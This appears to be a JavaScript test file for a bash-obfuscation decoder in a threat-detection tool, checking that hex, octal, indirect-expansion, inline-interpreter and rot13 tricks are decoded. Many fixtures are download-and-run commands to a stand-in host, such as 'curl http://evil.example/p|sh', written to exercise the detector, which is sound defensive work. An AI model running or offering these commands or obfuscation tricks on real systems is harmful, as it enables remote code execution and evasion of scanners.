'use strict';
// bash-obfuscation-phase2.test.js — Phase-2 additions under src/decoders/
// bash-obfuscation.js. Covers four new branches added in the "script
// deobfuscator deep-fill" pass:
//
//   B7.  echo -e '\xNN\xNN…' / echo -e '\NNN\NNN…' escape-chain executor
//   B8.  ${!pointer} indirect variable expansion
//   B9.  awk / perl / python{,3} / ruby / node / php inline executors
//   B10. tr rot13 here-string (two canonical orientations)
//
// Each test asserts BOTH that a candidate of the expected technique is
// emitted AND that the deobfuscated string contains the planted sentinel
// token. Cross-branch regressions surface as shape mismatches
// (typically the technique label drifted) or missing-sentinel failures.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/bash-obfuscation.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

function pick(cands, pred) { return host(cands.filter(pred)); }

// ───── B7: echo -e hex/octal escape chains ──────────────────────
test('bash echo -e hex: decodes \\xNN run to a LOLBin name', () => {
  // '\x77\x68\x6f\x61\x6d\x69' spells "whoami".
  const text = `echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /echo -e Escape Chain/.test(c.technique));
  assert.ok(hits.length >= 1, `expected echo -e candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /whoami/);
});

test('bash echo -e octal: decodes \\NNN run to a LOLBin name', () => {
  // \143\165\162\154 = "curl".
  const text = `echo -ne '\\143\\165\\162\\154 http://evil.example/p'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /echo -e Escape Chain/.test(c.technique));
  assert.ok(hits.length >= 1, `expected echo -e octal candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /curl/);
});

test('bash echo -e: suppresses short/benign escape runs', () => {
  // Only two escapes + body is non-SENSITIVE — must not fire.
  const text = `echo -e 'hello\\nworld\\n'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = host(cands).filter(c => /echo -e Escape Chain/.test(c.technique));
  assert.equal(hits.length, 0,
    `unexpected echo -e candidate: ${JSON.stringify(hits)}`);
});

// ───── B8: ${!pointer} indirect variable expansion ──────────────
test('bash indirect expansion: resolves two-hop pointer to LOLBin', () => {
  const text = 'a=whoami\nb=a\neval "${!b}"';
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Indirect Variable Expansion/.test(c.technique));
  assert.ok(hits.length >= 1, `expected indirect candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /whoami/);
});

test('bash indirect expansion: rejects pointer whose value is not an identifier', () => {
  // `a="not valid"` → `${!b}` cannot resolve because "not valid" isn't
  // a legal bash identifier.
  const text = 'a=\'not valid\'\nb=a\n${!b}';
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = host(cands).filter(c => /Indirect Variable Expansion/.test(c.technique));
  assert.equal(hits.length, 0,
    `unexpected indirect candidate: ${JSON.stringify(hits)}`);
});

// ───── B9: inline-interpreter executors ─────────────────────────
test('bash inline awk: surfaces BEGIN{system(...)} body', () => {
  const text = `awk 'BEGIN{system("curl http://evil.example/p|sh")}'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Inline awk Executor/.test(c.technique));
  assert.ok(hits.length >= 1, `expected awk candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /curl.*sh/);
});

test('bash inline perl -e: surfaces system(...) body', () => {
  const text = `perl -e 'system("wget http://evil.example/p -O- | bash")'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Inline perl Executor/.test(c.technique));
  assert.ok(hits.length >= 1, `expected perl candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /wget/);
});

test('bash inline python -c: surfaces os.system body', () => {
  const text = `python -c 'import os; os.system("curl http://evil.example/p|sh")'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Inline python Executor/.test(c.technique));
  assert.ok(hits.length >= 1, `expected python candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /os\.system/);
});

test('bash inline python3 -c: surfaces subprocess body', () => {
  const text = `python3 -c "import subprocess; subprocess.call(['bash','-c','curl http://x|sh'])"`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Inline python3 Executor/.test(c.technique));
  assert.ok(hits.length >= 1, `expected python3 candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /subprocess/);
});

test('bash inline ruby -e: surfaces exec() body', () => {
  const text = `ruby -e 'exec("curl http://evil.example/p|sh")'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Inline ruby Executor/.test(c.technique));
  assert.ok(hits.length >= 1, `expected ruby candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /curl/);
});

test('bash inline node -e: surfaces child_process.exec body', () => {
  const text = `node -e 'require("child_process").exec("curl http://evil.example/p|sh")'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Inline node Executor/.test(c.technique));
  assert.ok(hits.length >= 1, `expected node candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /child_process/);
});

test('bash inline php -r: surfaces system body', () => {
  const text = `php -r 'system("curl http://evil.example/p|sh");'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Inline php Executor/.test(c.technique));
  assert.ok(hits.length >= 1, `expected php candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /curl/);
});

test('bash inline interpreter: ignores benign awk `{print $2}`', () => {
  // Body has no exec / SENSITIVE vocabulary → must not fire.
  const text = `awk -e '{print $2}'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = host(cands).filter(c => /Inline.*Executor/.test(c.technique));
  assert.equal(hits.length, 0,
    `unexpected inline-interpreter candidate: ${JSON.stringify(hits)}`);
});

// ───── B10: tr rot13 here-string ────────────────────────────────
test('bash tr rot13: decodes here-string via A-Za-z ↔ N-ZA-Mn-za-m', () => {
  // rot13('whoami') = 'jubnzv'.
  const text = `tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< 'jubnzv'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /tr rot13/.test(c.technique));
  assert.ok(hits.length >= 1, `expected rot13 candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /whoami/);
});

test('bash tr rot13: accepts reversed N-Z/A-M → A-Z orientation', () => {
  // rot13('curl') = 'phey'.
  const text = `tr 'N-ZA-Mn-za-m' 'A-Za-z' <<< 'phey'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /tr rot13/.test(c.technique));
  assert.ok(hits.length >= 1, `expected reversed-rot13 candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /curl/);
});

test('bash tr rot13: ignores arbitrary non-rot13 translate sets', () => {
  // `tr 'abc' 'xyz'` is a general substitution; we don't simulate it.
  const text = `tr 'abc' 'xyz' <<< 'abcabc'`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = host(cands).filter(c => /tr rot13/.test(c.technique));
  assert.equal(hits.length, 0,
    `unexpected generic-tr candidate: ${JSON.stringify(hits)}`);
});

// ───── Amp-budget invariant: every Phase-2 candidate clipped ────
test('phase-2 branches: every candidate honours the 32× / 8 KiB amp cap', () => {
  const seeds = [
    `echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69'`,
    'a=whoami\nb=a\n${!b}',
    `perl -e 'system("curl http://x|sh")'`,
    `tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< 'jubnzv'`,
  ];
  const AMP_RATIO = 32;
  const AMP_MAX = 8 * 1024;
  for (const text of seeds) {
    const cands = host(d._findBashObfuscationCandidates(text, {}));
    for (const c of cands) {
      const rawLen = (c.raw || '').length;
      const deobfLen = (c.deobfuscated || '').length;
      const budget = Math.min(AMP_MAX, rawLen * AMP_RATIO);
      assert.ok(deobfLen <= budget,
        `amp cap exceeded: technique=${c.technique} raw=${rawLen} deobf=${deobfLen} budget=${budget}`);
    }
  }
});
